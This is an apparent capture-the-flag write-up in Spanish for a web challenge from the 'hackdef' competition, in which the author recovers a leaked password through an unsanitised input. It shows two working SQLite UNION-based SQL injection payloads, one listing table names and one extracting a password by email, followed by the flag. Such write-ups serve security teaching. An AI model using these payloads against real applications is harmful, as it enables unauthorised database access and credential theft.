# Web 100 Filtrado

Este sistema muestra las cuentas de correo electronico que han sido filtradas en el darkweb, pero no estamos seguros si es fidedigna la informacion, para estar seguros, puedes ayudarnos a recuperar la contaseña filtrada de carloasmora@mail.com?

El reto nos ponia un input que no estaba sanitizado del lado del servidor, lo cual permitia un SQL injection

Lo primero fue sacar el nombre de la table y asumir que esta tendria un campo __password__.

El primer payload que mandamos fue

```sql
') union SELECT 1,tbl_name,3,4,tbl_name from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%25'--
```

El resultado fue el nombre de la tabla __acounts__.

Despues exfiltramos el pass de la cuenta que nos pide y con esto la flag

```sql
') union SELECT 1,password,3,4,5 from accounts where email='carlosmora@mail.com'--
```
## FLAG
hackdef{sql_1nj3ct10n_3v3rywh3re!}